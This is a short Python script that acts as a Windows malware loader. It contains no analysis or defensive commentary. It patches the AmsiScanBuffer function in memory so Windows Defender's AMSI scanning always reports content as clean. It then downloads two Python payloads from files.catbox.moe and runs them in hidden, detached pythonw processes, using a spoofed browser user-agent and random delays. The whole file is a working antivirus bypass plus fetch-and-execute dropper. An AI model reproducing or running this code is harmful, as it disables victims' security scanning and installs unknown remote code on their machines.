import ctypes
import ctypes.wintypes as wt
import subprocess
import os
import time
import random

# === PAYLOAD ORCHESTRATION ===
PAYLOADS = [
    "https://files.catbox.moe/nsysud.py",
    "https://files.catbox.moe/k2vg34.py"
]
# =============================

kernel32 = ctypes.windll.kernel32

def patch_amsi():
    """Neutralize Windows Defender memory scanning before any script execution"""
    try:
        h_amsi = kernel32.GetModuleHandleA(b"amsi.dll")
        if not h_amsi:
            return
        scan_buf = kernel32.GetProcAddress(h_amsi, b"AmsiScanBuffer")
        if not scan_buf:
            return
        old_prot = wt.DWORD()
        patch = b'\x31\xC0\xC3'  # xor eax, eax; ret (S_OK = clean)
        kernel32.VirtualProtect(scan_buf, 3, 0x40, ctypes.byref(old_prot))
        ctypes.memmove(scan_buf, patch, 3)
        kernel32.VirtualProtect(scan_buf, 3, old_prot.value, ctypes.byref(old_prot))
    except:
        pass

def spawn_ghost(url):
    """
    Fetch and execute a single payload in a detached pythonw process.
    Fully independent — crashes here don't kill siblings.
    """
    try:
        py_code = (
            f"import urllib.request,sys;"
            f"r=urllib.request.Request('{url}', headers={{'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'}});"
            f"exec(urllib.request.urlopen(r, timeout=20).read().decode());"
            f"sys.exit(0)"
        )
        subprocess.Popen(
            ['cmd', '/c', 'start', '', 'pythonw', '-c', py_code],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            creationflags=subprocess.CREATE_NO_WINDOW,
            cwd=os.environ.get('TEMP', 'C:\\Windows\\Temp')
        )
        return True
    except:
        return False

def main():
    patch_amsi()
    for url in PAYLOADS:
        spawn_ghost(url)
        time.sleep(random.uniform(2.0, 5.0))

if __name__ == "__main__":
    main()
